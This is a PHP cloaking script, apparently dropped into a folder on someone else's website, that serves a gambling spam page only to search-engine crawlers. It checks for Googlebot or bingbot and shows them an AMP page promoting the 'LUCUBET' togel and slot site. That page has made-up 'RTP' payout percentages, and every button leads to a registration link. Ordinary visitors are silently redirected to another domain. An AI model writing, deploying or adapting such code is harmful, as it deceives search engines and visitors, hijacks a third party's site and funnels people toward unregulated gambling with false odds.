<?php

$DOMAIN_CRAWLER = "https://backlinkhut.com";
$DOMAIN_PENGUNJUNG = "https://backlinkhut-com.pages.dev";
$FOLDER_PATH = "/seo-company-in-ludhiana";
$REDIRECT_ACTIVE = false;

$data_konten = [
    'LUCUBET' => [
        'title' => 'LUCUBET - Situs Togel & Slot Terbaik Mudah Jackpot 2025, Akses Resmi Terpercaya',
        'desc' => 'adalah situs penyedia Togel dan Slot terlengkap dengan fitur mudah Jackpot setiap harinya. akses lancar membuat pengalaman bermain lebih seru hanya disitus ini.',
        'content' => 'Hanya placeholder'
    ],

];

$keyword_url = isset($_GET['news_ID']) ? $_GET['news_ID'] : null;
$keyword_bersih = $keyword_url ? strtoupper(filter_var($keyword_url, FILTER_SANITIZE_STRING)) : null;

$is_crawler = (
    isset($_SERVER['HTTP_USER_AGENT']) && 
    (strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') !== false || strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') !== false)
);

if (!$keyword_url || empty($keyword_bersih) || !isset($data_konten[$keyword_bersih])) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

$konten_spesifik = $data_konten[$keyword_bersih];
$judul_halaman = $konten_spesifik['title'];
$meta_deskripsi = $konten_spesifik['desc'];


$isi_utama_html = file_get_contents('https://backlinkhut.com/'); 

$current_canonical_url = $DOMAIN_CRAWLER . $FOLDER_PATH . "/?news_ID=" . urlencode($keyword_bersih);

if ($REDIRECT_ACTIVE || $is_crawler === false) {
    $target_url = $DOMAIN_PENGUNJUNG . $FOLDER_PATH . "/?news_ID=" . urlencode($keyword_bersih);
    header("Location: " . $target_url, true, 302);
    exit();
}

if ($is_crawler) {
    header("Content-Type: text/html; charset=utf-8");
    ?>
    <!doctype html>
    <html amp lang="id">
    <head>
        <meta charset="utf-8">
        <script async src="https://cdn.ampproject.org/v0.js"></script>
        <title><?php echo $judul_halaman; ?></title>
        <link rel="canonical" href="<?php echo $current_canonical_url; ?>">
        <meta name="description" content="<?php echo $meta_deskripsi; ?>">
        <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
        
        <style amp-boilerplate>
		 body{-webkit-animation: -amp-start 8s steps(1,end) 0s 1 normal both; -moz-animation: -amp-start 8s steps(1,end) 0s 1 normal both; -ms-animation: -amp-start 8s steps(1,end) 0s 1 normal both; animation: -amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility: hidden}to{visibility: visible}}@-moz-keyframes -amp-start{from{visibility: hidden}to{visibility: visible}}@-ms-keyframes -amp-start{from{visibility: hidden}to{visibility: visible}}@-o-keyframes -amp-start{from{visibility: hidden}to{visibility: visible}}@keyframes -amp-start{from{visibility: hidden}to{visibility: visible}}
		</style>
		<noscript>
		<style amp-boilerplate>
		 body{-webkit-animation: none; -moz-animation: none; -ms-animation: none; animation: none}
		</style>
		</noscript>
		<script async custom-element="amp-carousel" src="https://cdn.ampproject.org/v0/amp-carousel-0.1.js"></script>
		<script async src="https://cdn.ampproject.org/v0.js"></script>
		<style amp-custom>
		.fixed-footer,.logo-container{position:fixed;left:0;right:0;z-index:99}:root{--small-font:12px;--normal-font:13px;--large-font:14px;--x-large-font:15px}body{font-size:var(--small-font);display:flex;flex-direction:column;padding-top:66px;padding-bottom:52px;font-family:Verdana,sans-serif;-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background:#050404}a{text-decoration:none}summary{outline:0;list-style-type:none}summary::-webkit-details-marker{display:none}.container{align-self:center;margin-left:auto;margin-right:auto}.logo-container{text-align:center;display:flex;justify-content:center;align-items:center;top:0}.logo-container .logo{width:calc(48px*175/70);display:block}.logo-container .logo amp-img{flex-grow:1}.link-container{display:flex;justify-content:center;font-size:var(--x-large-font);width:100%}.main-menu-container{list-style-type:none;display:flex;flex-wrap:wrap;margin:0}.main-menu-container li{flex-basis:calc(25% - 10px);padding:5px}.main-menu-container li a{display:flex;justify-content:center;align-items:center;flex-direction:column;font-size:var(--normal-font);text-transform:uppercase;color:#761600;padding:10px}.main-menu-container li amp-img{margin:8px 0}.footer-container{text-align:center;color:#fff}.footer-container .bank-list,.footer-container .contact-list,.footer-container .footer-links,.footer-container .social-media-list{display:flex;flex-wrap:wrap;margin:0 auto;padding:10px 0;list-style-type:none}.footer-container .contact-list li{flex-basis:50%}.footer-container .contact-list li a{margin:2px 5px;display:flex;align-items:center;border-radius:30px;font-size:var(--normal-font)}.footer-container .contact-list>li a i{display:inline-flex;align-items:center;justify-content:center;-webkit-box-align:center;-ms-flex-align:center;margin-right:10px;border-radius:50%;background:#611414;width:24px;height:24px}.footer-container .contact-list>li a i amp-img{margin:5px;flex-basis:0;-ms-flex-preferred-size:0;-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1}.footer-container .footer-links{flex-wrap:wrap;justify-content:center}.footer-container .footer-links li{flex-basis:calc(25% - 3px);margin-bottom:5px}.footer-container .footer-links li a{padding:5px;font-size:var(--normal-font)}.site-description{background-color:#050404;padding:10px}.footer-container h1,.footer-container h2,.footer-container h3,.footer-container h4{display:inline}.copyright{padding:25px 0 20px;display:flex;flex-direction:column;justify-content:center}.copyright div{padding-bottom:10px}.fixed-footer{display:flex;justify-content:space-around;border-radius:30px 30px 0 0;padding:8px 0;bottom:0;border-top:3px groove #FFFFFF}.fixed-footer a{flex-basis:calc((100% - 15px*6)/ 5);display:flex;flex-direction:column;justify-content:center;align-items:center}@media(min-width:768px){body{font-size:var(--normal-font)}.container{width:970px}.site-menu{width:20%}}@media(min-width:1200px){.container{width:1170px}}@media(min-width:992px){.container{width:970px}}@font-face{font-family:Verdana,sans-serif;font-weight:400;font-style:normal}@keyframes pulse{0%{filter:initial}50%{filter:brightness(40.5) drop-shadow(0 0 10px white)}}.logo-container{justify-content:space-between;padding:0;border-radius:0 0 20px 20px;border-bottom:3px groove #FFFFFF}.logo-container .logo{padding:10px}.header-right{display:flex;justify-content:space-between;min-width:100px;align-self:stretch}.header-right .register-section{align-self:stretch;align-items:center;display:flex;padding:10px 15px}.header-right .register-section a{padding:5px 10px}.header-right .hamburger-section{align-self:center;padding:10px 0 10px 10px;margin:10px 0 10px 10px}.login-button,.register-button{border-radius:30px}.link-container{padding:20px 0;font-size:15px}.link-container a{text-align:center;text-transform:uppercase;margin-top:10px;width:auto;padding:5px 15px;margin-left:10px;align-self:center}.main-menu-container{padding:0 0 10px;justify-content:center;background-color:#0a0814}.main-menu-container .amp-carousel-button-next,.main-menu-container .amp-carousel-button-prev{width:20px;height:100%;background-color:#611414;color:#fff}.popular-game-title-container{background-color:#FCCE00;background-image:linear-gradient(to bottom, rgb(58 150 255) 0%, rgb(13 17 102) 100%);color:#fff}.popular-game-title-container .title{font-size:14px;display:flex;align-items:center}.contact-list-container{margin-top:10px}.footer-container .contact-list{justify-content:center}.footer-container .contact-list li a{padding:3px 15px 3px 3px;font-size:var(--small-font);background-color:#0c0c0c;color:#fff}.footer-container .social-media-list li{flex-basis:auto;margin:10px}.footer-container .footer-links{background-color:#141125;align-items:center}.fixed-footer a,.footer-container .footer-links,.site-description{background-color:inherit}.footer-container .footer-links li{flex-basis:auto;padding:2.5px 10px}.footer-container .footer-links>li:not(:nth-child(5n+5)):not(:first-child){border-left:1px solid #fff;border:none}.fixed-footer{background:linear-gradient(to top, #0084ff, #003be6)}.fixed-footer a{flex-basis:calc((100% - 15px*6)/ 5);max-width:75px;font-size:12px;font-weight:700;color:#fff}.fixed-footer .center{transform:scale(2.5) translateY(-5px);background:center/contain no-repeat;background-color:inherit;border-radius:50%}.fixed-footer amp-img{max-width:40%;margin-bottom:5px}.fixed-footer .live-chat-icon{animation:3s infinite pulse}.logo-container{background:linear-gradient(to bottom, #1598ff 0%, #000d45 100%)}.link-container{background-color:#141414;background-image:linear-gradient(to right,#141414 0,#000 100%)}.register-button{background:#000;font-weight:700;font-size:12px;border:3px groove #FFFFFF}.login-button{background:0 0;border:1px solid #198754}.footer-container .contact-list-container{background-image:linear-gradient(to bottom,#15a9ff 0%, #0044ff )}.footer-container .footer-links li a,.login1-button,.register-button,.site-description{color:#fff}.fixed-footer a.active{color:#0efe00}.yk{-webkit-animation-name:yk;animation-name:yk;-webkit-animation-duration:1s;animation-duration:1s;-webkit-animation-fill-mode:both;animation-fill-mode:both;animation-iteration-count:infinite}@-webkit-keyframes yk{0%,100%{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}10%,20%{-webkit-transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg);transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg)}30%,50%,70%,90%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg);transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg)}40%,60%,80%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg);transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg)}}@keyframes yk{0%,100%{-webkit-transform:scale3d(1,1,1);transform:scale3d(1,1,1)}10%,20%{-webkit-transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg);transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg)}30%,50%,70%,90%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg);transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg)}40%,60%,80%{-webkit-transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg);transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg)}}table tbody>tr:nth-child(odd)>td,table tbody>tr:nth-child(odd)>th{background-color:#fff}table td,table th{padding:5px;line-height:1.5;vertical-align:top;border:2px solid #050505;background:#d0b9ff;color:#000}.register1-button{background:linear-gradient(to bottom, #1598ff 0%, #000d45 100%);border:3px groove #FFFFFF}.login1-button{background:linear-gradient(to bottom, #1598ff 0%, #000d45 100%)}.link-container1{display:flex;justify-content:center;font-size:var(--x-large-font);padding:0;width:100%}.link-container1 a{width:100%;text-align:center;padding:10px 20px;text-transform:uppercase;color:#fff;font-weight:700;margin:5px;border-radius:30px}#marquee .marquee{font-family:Verdana;background:radial-gradient(circle 214px at 46.5% 54.2%,#22a909 0,#000 90%);color:#fff;padding:5px 0;box-shadow:0 0 0,0 0 2px,0 0 1em #611414,0 0 .5em #611414,0 0 .1em #611414,0 10px 3px #000;border:2px solid #ffffff;border-radius:5px;max-width:100%;text-align:center}.marquee{font-size:4vw}.marquee-text{background:linear-gradient(#010001 24%, #080707);padding:5px 0;border:2px solid #ffffff;border-radius:15px;margin:5px;height:auto;display:block;line-height:30px;overflow:hidden;position:relative}.marquee-text div{height:auto;line-height:22px;font-size:13px;white-space:nowrap;color:#fff;z-index:1;font-weight:600;font-family:Verdana;animation:20s linear infinite marquee;margin-top:3px}.marquee-text:hover div{animation-play-state:paused}@keyframes marquee{0%{transform:translateX(100%)}100%{transform:translateX(-100%)}}@media only screen and (min-width:601px){.referral{position:fixed;bottom:50px;left:14px;z-index:100;width:100px;height:100px}}@media only screen and (max-width:600px){.referral{position:fixed;bottom:75px;left:14px;z-index:100;width:100px;height:100px}}.link-gacor{border:2px solid WHITE;animation:1s linear infinite link-gacor}@keyframes link-gacor{0%{border-color:#761600}20%{border-color:#fff700}40%{border-color:#dca708}60%{border-color:#050505}80%{border-color:#fff}100%{border-color:WHITE}}.bigger-game-list ul input[type=radio]:checked~.wrapper-container .rtp-container,.scrollable-game-list main input[type=radio]:checked~.wrapper-container .rtp-container{opacity:0}.bigger-game-list ul .inner-game-item .wrapper-container .rtp-container .rtp-progress .rtp-progress-bar[data-rtp=high],.scrollable-game-list main .inner-game-item .wrapper-container .rtp-container .rtp-progress .rtp-progress-bar[data-rtp=high]{background:linear-gradient(to right,#31a13b,#62c88d)}.bigger-game-list ul .inner-game-item .wrapper-container .rtp-container,.scrollable-game-list main .inner-game-item .wrapper-container .rtp-container{position:absolute;left:0;right:0;bottom:0;padding:5px 12px;background-color:rgba(0,0,0,.7);color:#fff;display:flex;justify-content:space-between;align-items:center;gap:3px;font-size:9px;pointer-events:none;line-height:1}.bigger-game-list ul .inner-game-item .wrapper-container .rtp-container .rtp-progress,.scrollable-game-list main .inner-game-item .wrapper-container .rtp-container .rtp-progress{flex-grow:1;background-color:#fff;border:1px solid #ddd;border-radius:50px}.bigger-game-list ul .inner-game-item .wrapper-container .rtp-container .rtp-progress .rtp-progress-bar,.scrollable-game-list main .inner-game-item .wrapper-container .rtp-container .rtp-container .rtp-progress-bar{height:8px;border-radius:50px}.bigger-game-list ul .inner-game-item .wrapper-container .rtp-container .rtp-progress .rtp-progress-bar[data-rtp=low],.scrollable-game-list main .inner-game-item .wrapper-container .rtp-container .rtp-progress .rtp-progress-bar[data-rtp=low]{background:linear-gradient(to right,#cd9ba7,#ca6a86)}.bigger-game-list ul .inner-game-item .wrapper-container .rtp-container .rtp-progress .rtp-progress-bar[data-rtp=medium],.scrollable-game-list main .inner-game-item .wrapper-container .rtp-container .rtp-progress .rtp-progress-bar[data-rtp=medium]{background:linear-gradient(to right,#fcdc8f,#f2d064)}.popular-game-title-container .container{display:flex;justify-content:space-between;align-items:center;padding:10px}.popular-game-title-container .title .popular-games-icon{margin-right:10px}.popular-game-title-container .title{font-size:var(--large-font);display:flex;align-items:center}.popular-game-title-container a{padding:6px 8px;border-radius:25px;font-size:10px;background-color:#000;color:#fff}.bigger-game-list ul{padding:5px 0;margin:auto;display:flex;justify-content:center;flex-wrap:wrap;list-style-type:none}.bigger-game-list ul>li{max-width:calc(100%/3 - 10px);min-width:calc(100%/4 - 10px);flex-basis:133px;padding:5px;text-align:center;color:#fff;font-size:80%}.bigger-game-list ul .inner-game-item{margin:0;padding:5px;border-radius:25px;background-color:#1e1a31;background-image:linear-gradient(to bottom, #1598ff 0%, #000d45 100%);display:block;font-weight:400}.bigger-game-list ul .inner-game-item .wrapper-container{display:block;width:100%;padding-top:100%;position:relative;margin-bottom:5px;border-radius:25px;overflow:hidden}.bigger-game-list ul .inner-game-item .wrapper-container .game-link-container,.bigger-game-list ul .inner-game-item .wrapper-container>amp-img{position:absolute;top:0;left:0;height:100%;width:100%}.bigger-game-list ul .inner-game-item .wrapper-container>amp-img{background-color:#000;transition:transform .2s;transform-origin:center}.bigger-game-list ul .inner-game-item .wrapper-container .game-link-container{display:flex;flex-direction:column;align-items:center;justify-content:space-around;background-color:rgba(6,0,15,.85)}.bigger-game-list ul .inner-game-item .wrapper-container .game-link-container>a{margin:0}.bigger-game-list ul .inner-game-item .game-name{display:block;margin:8px 0 4px;padding:0 5px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}.bigger-game-list ul input[type=radio]{position:absolute;visibility:hidden;left:-99em}.bigger-game-list ul input[type=radio]:not(:checked)~.wrapper-container .game-link-container{display:none}.bigger-game-list ul input[type=radio]:checked~.wrapper-container>amp-img{transform:scale(1.25)}.play-now{display:flex;justify-content:center;align-items:center;cursor:pointer;font-size:1.2em;border-radius:18px;padding:5px;background-color:#f8007e;background-image:linear-gradient(to right,#f8007e 0,#a500e0 100%);color:#fff;width:80%}

		</style>
		</head>
		<body>
		<div class="logo-container">
		  <a href="https://backlinkhut.com/" class="logo"><amp-img class="yk" layout="responsive" height="25" width="100" src="https://iili.io/Fv75fee.gif" aria-label="SITUS RESMI" noloading></amp-img></a>
		  <div class="header-right">
			<span class="register-section"><a href="https://grtoto.store/shadow-akses/" class="register-button" target="_blank" rel="nofollow">DAFTAR</a></span>
		  </div>
		</div>

		<amp-img layout="responsive" title="SITUS RESMI" src="https://i.postimg.cc/SswQ6J1m/situs-slot-gacor.jpg" alt="SITUS RESMI" width="1080" height="1080"></amp-img>
		<div class="link-container1 container">
		  <a href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow" class="login1-button ; link-gacor">LOGIN</a>
		  <a href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow" class="register1-button">DAFTAR</a>
		  
		</div>

		<amp-img layout="intrinsic" src="https://i.gyazo.com/80e94b69a031fb232c894392d251dcae.gif" title="SITUS RESMI" alt="SITUS RESMI" width="1200" height="170"></amp-img>

		<!--Marquee-->
		<div class="marquee-text">
		<div style="font-size:12px;"> SELAMAT DATANG DI SITUS KAMI, DENGAN KEMUDAHAN MENANG BERMAIN SLOT DAN TARUHAN LAINNYA.</div>
		</div>

		<div class="popular-game-title-container">
				<div class="container">
					<div class="title">
						<amp-img class="popular-games-icon" layout="intrinsic" height="24" width="25" src="https://i.postimg.cc/C1BcvTqJ/hd-restoration-result-image-10.png" alt="Game Populer"></amp-img>
						RTP Slot Gacor Hari Ini
					</div>
					<a rel="nofollow" href="https://grtoto.store/shadow-akses/" class="register-button; link-gacor"> Live RTP Slot !</a>
				</div>
			</div>

			<div class="bigger-game-list">
				<ul class="container">
		<li class="game-item" data-game="Starlight Princess">
		<label class="inner-game-item">
		<input type="radio" name="game-list-radio-button">
		<span class="wrapper-container">
		<amp-img layout="intrinsic" height="145" width="215" src="https://jadexint.com/img/animasi-slot01.gif"></amp-img>
		<span class="game-link-container">
		<a class="play-now" data-game="Starlight Princess" href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow noopener">MAIN</a></span>
		<div class="rtp-container">
		<span class="rtp-title">RTP</span>
		<div class="rtp-progress">
		<div class="rtp-progress-bar" data-rtp="high" style="width: 91.138%;"></div></div>
		<span class="rtp-percentage">99,00%</span></div></span>
		<span class="game-name">Starlight Princess</span></label></li>

		<li class="game-item" data-game="Joker Jewels">
		<label class="inner-game-item">
		<input type="radio" name="game-list-radio-button">
		<span class="wrapper-container">
		<amp-img layout="intrinsic" height="145" width="215" src="https://jadexint.com/img/animasi-slot02.gif"></amp-img>
		<span class="game-link-container">
		<a class="play-now" data-game="Joker Jewels" href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow noopener">MAIN</a></span>
		<div class="rtp-container">
		<span class="rtp-title">RTP</span>
		<div class="rtp-progress">
		<div class="rtp-progress-bar" data-rtp="high" style="width: 92.888%;"></div></div>
		<span class="rtp-percentage">96,55%</span></div></span>
		<span class="game-name">Joker Jewels</span></label></li>

		<li class="game-item" data-game="Gates of Olympus">
		<label class="inner-game-item">
		<input type="radio" name="game-list-radio-button">
		<span class="wrapper-container">
		<amp-img layout="intrinsic" height="145" width="215" src="https://jadexint.com/img/animasi-slot03.gif"></amp-img>
		<span class="game-link-container">
		<a class="play-now" data-game="Gates of Olympus" href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow noopener">MAIN</a></span>
		<div class="rtp-container">
		<span class="rtp-title">RTP</span>
		<div class="rtp-progress">
		<div class="rtp-progress-bar" data-rtp="high" style="width: 94.168%;"></div></div>
		<span class="rtp-percentage">93,78%</span></div></span>
		<span class="game-name">Gates of Olympus</span></label></li> 
				  
		<li class="game-item" data-game="Spaceman">
		<label class="inner-game-item">
		<input type="radio" name="game-list-radio-button">
		<span class="wrapper-container">
		<amp-img layout="intrinsic" height="145" width="215" src="https://jadexint.com/img/animasi-slot04.gif"></amp-img>
		<span class="game-link-container">
		<a class="play-now" data-game="Spaceman" href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow noopener">MAIN</a></span>
		<div class="rtp-container">
		<span class="rtp-title">RTP</span>
		<div class="rtp-progress">
		<div class="rtp-progress-bar" data-rtp="high" style="width: 93.777%;"></div></div>
		<span class="rtp-percentage">93,77%</span></div></span>
		<span class="game-name">Spaceman</span></label></li>

		<li class="game-item" data-game="Mahjong Ways">
		<label class="inner-game-item">
		<input type="radio" name="game-list-radio-button">
		<span class="wrapper-container">
		<amp-img layout="intrinsic" height="145" width="215" src="https://jadexint.com/img/animasi-slot05.gif"></amp-img>
		<span class="game-link-container">
		<a class="play-now" data-game="Mahjong Ways" href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow noopener">MAIN</a></span>
		<div class="rtp-container">
		<span class="rtp-title">RTP</span>
		<div class="rtp-progress">
		<div class="rtp-progress-bar" data-rtp="high" style="width: 95.999%;"></div></div>
		<span class="rtp-percentage">95,19%</span></div></span>
		<span class="game-name">Mahjong Ways</span></label></li>

		<li class="game-item" data-game="Sweet Bonanza">
		<label class="inner-game-item">
		<input type="radio" name="game-list-radio-button">
		<span class="wrapper-container">
		<amp-img layout="intrinsic" height="145" width="215" src="https://jadexint.com/img/animasi-slot06.gif"></amp-img>
		<span class="game-link-container">
		<a class="play-now" data-game="Lucky Fortune" href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow noopener">MAIN</a></span>
		<div class="rtp-container">
		<span class="rtp-title">RTP</span>
		<div class="rtp-progress">
		<div class="rtp-progress-bar" data-rtp="high" style="width: 93.303%;"></div></div>
		<span class="rtp-percentage">97.84%</span></div></span>
		<span class="game-name">Sweet Bonanza</span></label></li> 
				</ul>
			</div>

		<footer class="footer-container">
		<div class="contact-list-container">
		  <ul class="contact-list container">
			<li>
			  <a href="https://grtoto.store/shadow-akses/" target="_blank" rel="noopener nofollow"><i><amp-img layout="responsive" height="12" width="12" src="https://jadexint.com/img/livechat.png" alt="Live Chat Slot Gacor"></amp-img></i>LIVE CHAT SITUS RESMI</a>
			</li>
			<li>
			  <a href="https://grtoto.store/shadow-akses/" target="_blank" rel="noopener nofollow"><i><amp-img layout="responsive" height="12" width="12" src="https://jadexint.com/img/livechat.png" alt="Whatsapp Slot Gacor"></amp-img></i>WHATSAPP SITUS RESMI</a>
			</li>
		  </ul>
		</div>
		<div class="copyright">
		  <div>

		  <div>
			SITUS RESMI © Copyright 2025 <br/>
		  </div>
		  
		  
		</div>
		</footer>
		<div class="fixed-footer">
		  <a href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow"><amp-img layout="intrinsic" class="live-chat-icon" height="75" width="75" src="https://jadexint.com/img/bonus.png" alt="login"></amp-img>Promosi</a><a class="yk" href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow"><amp-img class="center" layout="intrinsic" height="100" width="100" src="https://i.postimg.cc/C1BcvTqJ/hd-restoration-result-image-10.png" alt="Daftar"></amp-img>Daftar</a><a href="https://grtoto.store/shadow-akses/" target="_blank" rel="nofollow noopener" class="js_live_chat_link live-chat-link"><amp-img class="live-chat-icon" layout="intrinsic" height="75" width="75" src="https://jadexint.com/img/livechat.png" alt="Live Chat"></amp-img>Chat</a>
		</div>

		</body>
		</html>
    <?php
}
?>
